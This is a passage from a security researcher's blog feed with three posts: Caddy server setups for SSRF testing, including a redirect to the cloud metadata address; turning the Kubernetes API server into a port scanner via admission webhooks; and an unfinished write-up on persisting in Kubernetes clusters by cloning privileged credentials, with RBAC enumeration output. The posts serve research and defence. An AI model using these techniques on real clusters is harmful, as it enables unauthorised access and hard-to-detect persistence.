&lt;h2 id=&quot;caddy-logging&quot;&gt;Caddy logging&lt;/h2&gt;

&lt;p&gt;The first setup I wanted was just to have a log of any requests hitting a port. Handy for determining whether a request is causing an SSRF. Having a server listening on all interfaces on port 80, responding with a fixed string and logging the output looks like this. Note that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log&lt;/code&gt; directive is inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:80&lt;/code&gt; block, as we’re logging request to that port.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Simple logger for access to port 80
:80 {
  respond &quot;Hello World&quot;
  log {
    output file 80access.log
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got that, just start it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo caddy run&lt;/code&gt; and you should see a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80access.log&lt;/code&gt; in the current directory. If you hit the server with a request, you should see something like this in the log file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2022/12/27 16:34:42.141 info    http.log.access.log0    handled request {&quot;request&quot;: {&quot;remote_ip&quot;: &quot;217.155.25.114&quot;, &quot;remote_port&quot;: &quot;19000&quot;, &quot;proto&quot;: &quot;HTTP/1.1&quot;, &quot;method&quot;: &quot;GET&quot;, &quot;host&quot;: &quot;my.test.server&quot;, &quot;uri&quot;: &quot;/&quot;, &quot;headers&quot;: {&quot;Accept-Language&quot;: [&quot;en-GB,en;q=0.5&quot;], &quot;Accept-Encoding&quot;: [&quot;gzip, deflate&quot;], &quot;Connection&quot;: [&quot;keep-alive&quot;], &quot;Upgrade-Insecure-Requests&quot;: [&quot;1&quot;], &quot;User-Agent&quot;: [&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot;], &quot;Accept&quot;: [&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;]}}, &quot;user_id&quot;: &quot;&quot;, &quot;duration&quot;: 0.000073504, &quot;size&quot;: 11, &quot;status&quot;: 200, &quot;resp_headers&quot;: {&quot;Server&quot;: [&quot;Caddy&quot;], &quot;Content-Type&quot;: [&quot;text/plain; charset=utf-8&quot;]}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;running-on-multiple-ports-and-tls&quot;&gt;Running on multiple ports and TLS&lt;/h2&gt;

&lt;p&gt;Adding new ports is just a matter of having another port block in the Caddyfile. For example adding a port 443 block looks like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Simple logger for 443 with valid TLS
my.test.server:443 {
  tls my@email.address
  respond &quot;Hello Secure World&quot;
  log {
    output file 443access.log
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this directive I’ve specified a host &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;my.test.server&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls&lt;/code&gt; directive which takes your e-mail address as an argument. The combination of these two settings unlocks a fun trick, which is that caddy will automatically request a TLS certificate for the host you specify (assuming of course that you point the DNS A record at the machine running the server and it’s Internet facing).&lt;/p&gt;

&lt;p&gt;This is very useful for services that require a valid TLS certificate.&lt;/p&gt;

&lt;h2 id=&quot;internal-tls-and-on-demand&quot;&gt;Internal TLS and “on-demand”&lt;/h2&gt;

&lt;p&gt;Of course sometimes you’ll be testing on an internal network, so that setup won’t work. If you don’t need valid TLS certs you can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal&lt;/code&gt; directive to generate self-signed certs. You can then add the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;on_demand&lt;/code&gt; directive to have Caddy generate a cert for any SNI host that’s requested.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:443 {
  tls internal {
    on_demand
  }
  log {
    output file 443access.log
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth noting you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;on_demand&lt;/code&gt; on an internet facing host too and Caddy will request a valid TLS cert for any host name that points at that server, but it’s not advised as it can cause rate limiting issues with Let’s Encrypt.&lt;/p&gt;

&lt;h2 id=&quot;reverse-proxy&quot;&gt;Reverse Proxy&lt;/h2&gt;

&lt;p&gt;So Caddy makes a nice way of handling things like TLS and providing simple responses. Sometimes you might want to use it as a front-end for a webserver running in some other language (e.g. Ruby). Setting Caddy as a reverse proxy is pretty easy just add a line like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse_proxy :8080&lt;/code&gt; and replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:8080&lt;/code&gt; with the port your webserver is listening on.&lt;/p&gt;

&lt;h2 id=&quot;redirect&quot;&gt;Redirect&lt;/h2&gt;

&lt;p&gt;A handy technique for SSRF can be where you want to convert an initial request which is a POST/PUT to be a GET request. You can do this with Caddy using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redir&lt;/code&gt; option. For example if you want to redirect a request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://169.254.169.254&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Redirect to metadata server
my.test.server:8444 {
  tls my@email.address
  redir http://169.254.169.254
  log {
    output file 8444access.log
  }
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;file-server&quot;&gt;File server&lt;/h2&gt;

&lt;p&gt;You can also use Caddy to serve files from a specific directory with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_server&lt;/code&gt; directives.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:80 {
  root * /my_files
  file_server
  log {
    output file access.log
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;respond-with-json&quot;&gt;Respond with JSON&lt;/h2&gt;

&lt;p&gt;you can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;respond&lt;/code&gt; directive and one thing I wanted to do was respond with a JSON object. This is pretty easy, just use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;respond&lt;/code&gt; directive and then specify the content type and the JSON object, and the content type is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/json&lt;/code&gt;. One trick to note is that I needed to remove all spaces in the response for it to work.&lt;/p&gt;

&lt;h2 id=&quot;debug&quot;&gt;Debug&lt;/h2&gt;

&lt;p&gt;As with any testing things don’t always go to plan, so adding the debug directive at the top of a Caddyfile (not in a port block) will give you a lot more information about what’s going on.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
  debug
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is just a small section of the things you can do with Caddy, and I’d recommend reading the &lt;a href=&quot;https://caddyserver.com/docs/&quot;&gt;docs&lt;/a&gt; for more ideas, but hopefully it’s useful to people wanting to have simple servers for SSRF testing :)&lt;/p&gt;
</description>
				<pubDate>Sat, 21 Jan 2023 08:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/01/21/Fun-with-Caddy-SSRF-Testing/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/01/21/Fun-with-Caddy-SSRF-Testing/</guid>
			</item>
		
			<item>
				<title>Fun with SSRF - Turning the Kubernetes API Server into a port scanner</title>
				<description>&lt;p&gt;I thought I’d start the new year with something a little fun that I’ve been looking at over the break (well for a certain definition of the word ‘fun’ :) ). Kubernetes has quite a rich API and in the various objects that you can create, some of them have URL or Service fields which, when used, cause the Kubernetes API server itself to make network requests (generally over HTTPS). Knowing this, it feels a bit like a Server-Side Request Forgery (SSRF) attack, so I wondered how possible it would be to implement something that can be used to scan for open ports on a target host from the Kubernetes API server.&lt;/p&gt;

&lt;p&gt;An important point to note here, is that this is all standard Kubernetes functionality, no 0-days or vulnerabilities are involved. To carry out this process you need to be able to create some high-privileged objects in the cluster, so in most cases there’s no privilege escalation involved.&lt;/p&gt;

&lt;p&gt;One slight exception to this, is that if you’re using Managed Kubernetes (AKS, EKS, GKE etc) you can use this to port scan some parts of the CSPs network, but this is just information disclosure and I’m sure their security architectures are robust enough that simple port scanning presents no real threat.&lt;/p&gt;

&lt;h2 id=&quot;using-validating-admission-webhooks&quot;&gt;Using Validating Admission Webhooks&lt;/h2&gt;

&lt;p&gt;The first object I thought of using for this is Validating Admission Webhooks, as they take either a service or URL as part of their specification, then when they receive a request for an in-scope object the Kubernetes API server passes the request to that URL, so it fits our profile.&lt;/p&gt;

&lt;p&gt;If we want to implement this technique, the next step is to work out how to trigger it and also do so in a relatively safe way, to avoid disrupting the overall operation of the cluster, while we’re port scanning. To do this we can create a validating admission webhook configuration that only looks at requests in a single namespace. If we create a dedicated namespace for the scanning, then we can ensure that the webhook only looks at requests in that namespace, and we can also delete the namespace when we’re done to clean up.&lt;/p&gt;

&lt;p&gt;Once we have our namespace and webhook, we just try to create a pod in that namespace, expecting it to fail, and then record the error message returned.&lt;/p&gt;

&lt;p&gt;So, a simplified version of our flow should look a little like this :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/kubernetes_vaw_ssrf.png&quot; alt=&quot;Sequence diagram for SSRF&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Trying this out manually, one thing that I noticed which is very handy for our purposes is that the Kubernetes API provides a verbose error message depending on what sort of error it encountered. This lets us differentiate between “no response”, “port closed” and “port open”, with some added details like “this port was open but didn’t speak HTTP”.&lt;/p&gt;

&lt;h2 id=&quot;automating-the-process&quot;&gt;Automating the process&lt;/h2&gt;

&lt;p&gt;Whilst it’s perfectly possible to do this manually, it’s pretty time-consuming as you need do have a set of steps like this&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Edit the template webhook manifest with the target host and port.&lt;/li&gt;
  &lt;li&gt;Check if the namespace exists, if not create it.&lt;/li&gt;
  &lt;li&gt;Check if the webhook exists, if it does delete it.&lt;/li&gt;
  &lt;li&gt;Create the new webhook.&lt;/li&gt;
  &lt;li&gt;Create a pod in the namespace.&lt;/li&gt;
  &lt;li&gt;Check the error message returned by the API server when it tries and fails to call the target admission webhook.
    &lt;ul&gt;
      &lt;li&gt;Return this to the user after interpreting the error for what it indicates.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Delete the webhook and the namespace.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I did what any good lazy person would do, and wrote some code to do it for me :)&lt;/p&gt;

&lt;p&gt;With the reminder of “don’t run this on production clusters!”, the PoC code is available &lt;a href=&quot;https://github.com/raesene/k8s_ssrf_portscanner&quot;&gt;here&lt;/a&gt;. You can use it to scan host/port combinations from the perspective of a Kubernetes API server. The code will try to interpret the error message that comes back and tell you if the port is unreachable/closed/open.&lt;/p&gt;

&lt;h2 id=&quot;demo&quot;&gt;Demo&lt;/h2&gt;

&lt;p&gt;Here’s a quick demonstration of how this works. In the video I’ve got an AKS cluster up and running and I’ll use the SSRF port scanner to hit a URL I control, so we can see the request (caddy.pwndland.uk).&lt;/p&gt;

&lt;p&gt;In the logs you can see the source IP of 40.88.207.52 and User-agent of “kube-apiserver-admission” showing that it’s the API server making the request.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/y9QBDlmk0jA&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This post just shows how it’s possible to leverage existing functionality on Kubernetes to perform scans from the perspective of the API server using validating admission webhooks, an interesting side-effect of how the API server is designed. There are other objects you could use for this I’m sure :)&lt;/p&gt;
</description>
				<pubDate>Mon, 02 Jan 2023 08:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/01/02/Fun-with-SSRF-Turning-the-Kubernetes-API-server-into-a-port-scanner/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/01/02/Fun-with-SSRF-Turning-the-Kubernetes-API-server-into-a-port-scanner/</guid>
			</item>
		
			<item>
				<title>Attack of the clones - Stealthy Kubernetes persistence with eathar, tòcan and teisteanas</title>
				<description>&lt;p&gt;Follwing on from the &lt;a href=&quot;https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html&quot;&gt;PCI Series&lt;/a&gt; I thought it’d be nice to do a bit more of an attack focused piece for a change!&lt;/p&gt;

&lt;p&gt;I noticed that Microsoft have released a new version of the their &lt;a href=&quot;https://www.microsoft.com/en-us/security/blog/2022/12/07/mitigate-threats-with-the-new-threat-matrix-for-kubernetes/&quot;&gt;threat matrix for Kubernetes&lt;/a&gt;, looking at the Persistence section, while they covered some of the usual suspects like static pods, there were some options that attackers can likely use to keep access to clusters that they didn’t cover, around the use of Kubernetes APIs to use or create long-lived credentials which clone system accounts.&lt;/p&gt;

&lt;p&gt;This kind of persistence technique would apply where the attacker has temporary access to relatively privileged credentials and wants to ensure that they retain access for the long term. this could be the case where an attacker has gained access to an administrator laptop, or where a disgruntled insider wants to retain access perhaps after they have left the organisation.&lt;/p&gt;

&lt;p&gt;This kind of attack is made easier by the fact that the major managed Kubernetes distributions (GKE, EKS, AKS) all place the API server on the Internet by default. Whilst their hardening guides might mention removing it from the Internet, looking at the &lt;a href=&quot;https://www.shodan.io/search/facet?query=product%3A%22Kubernetes%22&amp;amp;facet=org&quot;&gt;current statistics&lt;/a&gt; from Shodan we can see plenty of Kubernetes hosts exposed to the Internet from the major cloud providers, and plenty of other hosts from smaller providers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/k8sproductshodan.png&quot; alt=&quot;Kubernetes on Shodan by Organization&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;options-for-persistent-credentials&quot;&gt;Options for Persistent credentials.&lt;/h2&gt;

&lt;p&gt;There are effectively four ways, we can achieve the goal of having a long lasting set of privileged credentials for attacker persistence.&lt;/p&gt;

&lt;p&gt;The first option is to grab the cluster CA certificate and key which then lets us mint new credentials for any user in the cluster. This one notably only works with unmanaged clusters (so no running it on GKE, EKS or AKS). I’ve covered this one &lt;a href=&quot;https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/&quot;&gt;before&lt;/a&gt;, but it’s worth mentioning again as it’s a pretty easy way to get long lived credentials in the right kind of environment.&lt;/p&gt;

&lt;p&gt;The second one is to use the Kubernetes CSR API to create new long-lived client certificates. Here we’ll want to find a high privileged user in the cluster and effectively create a clone set of credentials for them. Kubernetes does not have a user database, so this is perfectly possible and the auditing tools won’t be able to tell the difference between the original and the clone.&lt;/p&gt;

&lt;p&gt;The third option is to use the TokenRequest API to create new long-lived service account token. As with the CSR option, we need to find a high privileged service account in the cluster and then create a clone set of credentials for it.&lt;/p&gt;

&lt;p&gt;The fourth one is the simplest and is mentioned in the threat matrix, which is that in older Kubernetes clusters (v1.23 and below) we can just access the service account token secrets associated with system accounts, grab the token and then we can use that to authenticate to the API server. Notably these secrets &lt;em&gt;do not expire&lt;/em&gt; and the only way to revoke their access is to delete the associated service account. Where we’re stealing the token of a core controller, that could be a bit of a tricky thing for the defender to fix.&lt;/p&gt;

&lt;h2 id=&quot;find-a-target-userservice-account-to-clone&quot;&gt;Find a target user/service account to clone&lt;/h2&gt;

&lt;p&gt;Effectively all these techniques start from the same point which is finding an existing high privileged account which is part of the operational workflow of the cluster, so that we can retrieve an existing credential or create a set of clone credentials that we can use.&lt;/p&gt;

&lt;p&gt;To do this we’ll use &lt;a href=&quot;https://github.com/raesene/eathar&quot;&gt;eathar&lt;/a&gt; which is a Kubernetes security scanner and has some checks for privileged RBAC access.&lt;/p&gt;

&lt;p&gt;We’ll be using clusters setup with standard defaults with whatever the vendor currently offers.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Kubeadm 1.25 (KinD)&lt;/li&gt;
  &lt;li&gt;AKS 1.24.6&lt;/li&gt;
  &lt;li&gt;EKS v1.23.13-eks-fb459a0&lt;/li&gt;
  &lt;li&gt;GKE v1.24.7-gke.900&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;kubeadm-125-cluster&quot;&gt;Kubeadm 1.25 Cluster&lt;/h3&gt;

&lt;p&gt;Starting with a vanilla Kubeadm 1.25 cluster, we can start by looking for wildcard users. These are users that have access to all resources in the cluster, and are effectively the same as having cluster admin access.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This isn’t actually really useful as the only subject is a Group, and we can’t use that to create a clone set of credentials, we really need a user or service account.&lt;/p&gt;

&lt;p&gt;The next thing we can try is looking for users who have “get secrets” at the cluster level. These users can retrieve any secret from the cluster, which is pretty useful with older clusters as we can use it for retrieving any service account tokens (as well as anything else held as secrets)&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one shows some better options, notably the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:kube-controller-manager&lt;/code&gt; user, and the two service accounts. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:node&lt;/code&gt; binding isn’t useful as (unusually) there are no subjects!&lt;/p&gt;

&lt;p&gt;Looking at the rights for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:kube-controller-manager&lt;/code&gt; we can see that not only does it have get secrets at the cluster level but also create on serviceaccounts/token which is useful for creating more credentials.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl auth can-i --list --as system:kube-controller-manager
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
endpoints                                       []                  [kube-controller-manager]   [get update]
leases.coordination.k8s.io                      []                  [kube-controller-manager]   [get update]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then looking at the rights for the two service accounts the persistent-volume-binder controller has some pretty useful rights including create pod and get secrets&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;kubectl auth can-i --list --as system:serviceaccount:kube-system:persistent-volume-binder
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;aks-1246&quot;&gt;AKS 1.24.6&lt;/h3&gt;

&lt;p&gt;Let’s take a look at how this would work in an AKS cluster. Let’s start by looking for wildcard users.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding aks-cluster-admin-binding
Subjects:
  Kind: User, Name: clusterAdmin
  Kind: User, Name: clusterUser
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Well, that was easy :) There are two user accounts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterAdmin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterUser&lt;/code&gt; which have full cluster admin access, so if we create a certificate for either of those we’ll have full cluster admin access. If we want a service account to clone we can look for principals who have get secrets at the cluster level&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding aks-service-rolebinding
Subjects:
  Kind: User, Name: aks-support
RoleRef:
  Kind: ClusterRole, Name: aks-service, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding csi-azurefile-node-secret-binding
Subjects:
  Kind: ServiceAccount, Name: csi-azurefile-node-sa, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: csi-azurefile-node-secret-role, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:aks-client-nodes
Subjects:
  Kind: Group, Name: system:nodes
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:azure-cloud-provider-secret-getter
Subjects:
  Kind: ServiceAccount, Name: azure-cloud-provider, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:azure-cloud-provider-secret-getter, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:persistent-volume-binding
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:persistent-volume-secret-operator, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see plenty of options to clone there, including the two we saw in Kubeadm.&lt;/p&gt;

&lt;h3 id=&quot;eks-v12313-eks-fb459a0&quot;&gt;EKS v1.23.13-eks-fb459a0&lt;/h3&gt;

&lt;p&gt;First up looking for wildcard users.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt; eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding eks:addon-cluster-admin
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that there’s a user account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eks:addon-manager&lt;/code&gt; which has full cluster admin access. Looking at for principals with the rights to get secrets we get the following:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding eks:addon-manager
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: eks:addon-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For service accounts we’ve got the same ones as we had with Kubeadm and AKS.&lt;/p&gt;

&lt;h3 id=&quot;gke-v1247-gke900&quot;&gt;GKE v1.24.7-gke.900&lt;/h3&gt;

&lt;p&gt;Looking at GKE for wildcard users, we can see the following:&lt;/p&gt;

